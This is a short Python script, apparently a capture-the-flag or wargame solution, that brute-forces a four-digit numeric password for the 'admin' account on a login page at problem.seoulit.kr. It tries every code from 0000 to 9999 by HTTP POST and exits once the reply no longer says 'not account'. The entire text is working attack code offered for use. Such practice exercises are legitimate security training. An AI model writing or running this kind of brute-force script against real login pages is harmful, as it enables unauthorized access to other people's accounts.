import requests
import sys
URL = "http://problem.seoulit.kr/web/nv74vbcv/1.php"
for a in range(0,10):
	for s in range(0,10):
		for d in range(0,10):
			for f in range(0,10):
				data = {'id': 'admin', 'pw': '{0}{1}{2}{3}'.format(a,s,d,f)}
				res = requests.post(URL, data)
				res=res.text
				#result =  res.read().decode("utf-8")
				if res.find("not account") != -1:
					print(data)
					print(res+" : {0}{1}{2}{3}".format(a,s,d,f))
				else:
					print(res)
					print("!!!!!!!!!!")
					sys.exit(1)